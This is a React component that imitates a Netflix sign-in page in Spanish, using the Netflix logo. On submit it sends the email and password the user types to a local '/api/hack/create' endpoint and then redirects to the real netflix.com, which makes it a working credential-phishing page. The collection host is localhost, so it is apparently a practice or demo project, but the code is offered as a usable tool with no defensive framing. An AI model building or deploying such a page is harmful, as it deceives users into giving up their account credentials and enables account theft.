import React from 'react';
import { useForm } from '../hooks/useForm';

import Logo from '../img/Netflix_Logo_RGB.png';

export const Home = () => {

    const [values, handleInputChange] = useForm({
        email: '',
        password: '',
    });

    const { email, password } = values;

    const onSubmit = async (e) => {
        e.preventDefault();
        const data = await fetch('http://localhost:5200/api/hack/create', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(values),
        });

        if (data) window.location.href = 'https://www.netflix.com/';
    }

    return (
        <div id="home">
            <nav>
                <img src={Logo} alt="Logo Netflix" />
            </nav>
            <div className="content">
                <div className="row">
                    <form onSubmit={onSubmit}>
                        <h2>Inicia Sesión</h2>
                        <input
                            type="email"
                            placeholder="Email"
                            name='email'
                            value={email}
                            onChange={handleInputChange}
                        />
                        <input
                            type="password"
                            placeholder="Contraseña"
                            name='password'
                            value={password}
                            onChange={handleInputChange}
                        />
                        <input type="submit" value="Iniciar sesión" />
                        <p>
                            <input type="checkbox" id="save" />
                            <label htmlFor="save">Recuérdame</label>
                        </p>
                        <p>
                            Primera vez en Netflix? <a href="https://www.netflix.com/">Suscríbete</a>
                        </p>
                    </form>
                </div>
            </div>
        </div>
    );
}
